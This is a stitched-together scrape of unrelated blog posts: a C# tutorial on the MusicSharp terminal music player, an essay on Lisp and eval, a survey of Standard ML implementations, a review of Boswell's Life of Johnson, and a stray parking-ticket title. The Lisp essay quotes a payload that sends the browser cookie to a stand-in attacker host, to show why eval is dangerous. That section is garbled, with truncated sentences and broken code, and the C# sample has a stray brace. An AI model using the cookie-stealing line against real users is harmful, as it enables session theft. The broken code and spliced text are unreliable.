<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" alt="MusicSharp UI Mockup" title="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" alt="MusicSharp first build screenshot" title="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" alt="Screenshot of the MusicSharp menu bar" title="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" alt="Screenshot of the MusicSharp about dialog" title="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" alt="MusicSharp first build running on macOS Catalina" title="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>

<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions.

<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again.

What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>

<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>

<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>

        <p>Incredibly, Standard ML implementations are still actively
developed. <a href="http://mlton.org/">MLton</a>, <a href="https://polyml.org/">Poly/ML</a>,
<a href="https://elsman.com/mlkit/">MLKit</a>,
<a href="https://www.pllab.riec.tohoku.ac.jp/smlsharp/">SML#</a> and
<a href="http://smlnj-gforge.cs.uchicago.edu/scm/viewvc.php/?root=smlnj">SML/NJ</a>
are the most prominent. Discussion on the future direction of Standard
ML <a href="https://github.com/SMLFamily/Successor-ML/issues">remains healthy as
well</a>.</p>
<p>And somehow OCaml's lesser known cousin still beats out OCaml for
multicore threading support (in Poly/ML).</p>
<p>While MLton hasn't merged with
<a href="https://github.com/kayceesrk/multiMLton">MultiMLton</a> or
<a href="https://github.com/UBMLtonGroup/RTMLton">RTMLton</a> to support
multicore, a <a href="https://github.com/mpllang/mpl">new fork of MLton with
parallelism</a> is pretty far along and
in active development at CMU.</p>
<p>
  A commentor shared
  <a href="https://github.com/ManticoreProject/manticore">Manticore</a>,
  another implementation with parallelism support in active
  development at UChicago.
</p><p>Furthermore, the last few years have welcomed some entirely new
implementations. <a href="https://github.com/KeenS/webml">WebML</a>, by a
prominent open source hacker, is written in Rust and compiles Standard
ML to WebAssembly. <a href="https://sosml.org/">SOSML</a> is an interpreter
written in TypeScript by former students of Saarland University. It
features <a href="https://sosml.org/editor">a nifty online
IDE</a>.</p>
<p>
  A commenter
  shared <a href="https://github.com/SomewhatML/sml-compiler">SomewhatML</a>,
  an actively developing compiler for Standard ML written in Rust.
</p><p>There have also been some new experimental spins on Standard ML in
the last few years. <a href="https://github.com/julianhyde/morel">Morel</a> is an
interpreter with some nice syntax extensions written in Java by the
author of Apache Calcite. And <a href="https://github.com/elpinal/bright-ml">Bright
ML</a> is a spin on Standard ML and
OCaml written in Standard ML (and using the abandoned <a href="https://mosml.org/">Moscow
ML</a> compiler of all implementations).</p>
<p>So if you're looking for an easy intro to the ML family of languages,
I still recommend the simplicity and performance of Standard ML and
its small but definitely, surprisingly, not dead community. :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

Using FOIA Data and Unix to halve major source of parking tickets

<h3>Intro</h3>

